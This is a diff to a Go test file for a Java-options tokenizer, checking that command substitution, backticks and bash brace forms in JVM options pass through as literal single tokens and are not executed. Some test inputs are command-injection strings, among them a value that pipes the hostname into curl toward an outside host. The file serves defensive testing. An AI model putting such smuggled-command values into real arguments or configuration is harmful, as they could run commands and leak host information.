@@ -36,14 +36,37 @@ func TestTokenizeJavaOpts(t *testing.T) {
 		{"semicolon literal", "-Dx=a;b", []string{"-Dx=a;b"}},
 		{"redirect literal", "-Dx=a>b", []string{"-Dx=a>b"}},
 
-		// Security: command substitution is NOT executed; passed through literally.
-		// Unquoted, the space inside splits it into two literal tokens (correct
-		// word-splitting) — neither is executed.
-		{"command substitution unquoted", "-Dx=$(echo HACK)", []string{"-Dx=$(echo", "HACK)"}},
+		// Security: command substitution is NOT executed; passed through literally
+		// as a single token so the app does not crash with "class not found".
+		{"command substitution unquoted", "-Dx=$(echo HACK)", []string{"-Dx=$(echo HACK)"}},
+		{"command substitution with pipe", "-Dx=$(hostname | tr a b)", []string{"-Dx=$(hostname | tr a b)"}},
+		{"command substitution nested parens", "-Dx=$(foo (bar))", []string{"-Dx=$(foo (bar))"}},
 		// Quoted, it stays a single literal argument and is never executed.
 		{"command substitution quoted", `-Dx="$(echo danger)"`, []string{"-Dx=$(echo danger)"}},
 		{"backtick literal", "-Dx=`id`", []string{"-Dx=`id`"}},
+		{"backtick with spaces", "-Dx=`hostname -f`", []string{"-Dx=`hostname -f`"}},
+
+		// ${...} extended bash forms with spaces — pass literally to JVM as one token.
+		{"brace default with spaces", "-Dx=${MY_VAR:-hello world}", []string{"-Dx=${MY_VAR:-hello world}"}},
+		{"brace replacement with spaces", "-Dx=${MY_VAR//foo/bar baz}", []string{"-Dx=${MY_VAR//foo/bar baz}"}},
+		{"brace simple no spaces", "-Dx=${MY_VAR}", []string{"-Dx=${MY_VAR}"}},
+		{"brace nested braces in pattern", "-Dx=${MY_VAR//foo{bar}/baz qux}", []string{"-Dx=${MY_VAR//foo{bar}/baz qux}"}},
+		{"brace assign default with spaces", "-Dx=${MY_VAR:=hello world}", []string{"-Dx=${MY_VAR:=hello world}"}},
 		{"dollar var literal", "-Dx=$HOME", []string{"-Dx=$HOME"}},
+
+		// Full manifest scenario (issue #1301 reproducer with all edge cases):
+		//   -Dfoo="bar baz" -DcronSched="0 */7 * * * *" -Dbar=$HOME
+		//   -Dwhere=$( hostname | tr '\n' | curl -v 'https://example.me')
+		//   -Dmyfile=c:\\first\\second\\file.txt;ext
+		// $HOME is already expanded by profile.d before javaexec sees it.
+		{"full manifest scenario", `-Dfoo="bar baz" -DcronSched="0 */7 * * * *" -Dbar=/home/vcap/app -Dwhere=$( hostname | tr '\n' | curl -v 'https://example.me') -Dmyfile=c:\\first\\second\\file.txt;ext`,
+			[]string{
+				"-Dfoo=bar baz",
+				"-DcronSched=0 */7 * * * *",
+				"-Dbar=/home/vcap/app",
+				`-Dwhere=$( hostname | tr '\n' | curl -v 'https://example.me')`,
+				`-Dmyfile=c:\first\second\file.txt;ext`,
+			}},
 
 		// Backslash follows POSIX shell rules (parity with previous eval form):
 		// unquoted backslash escapes the next character.
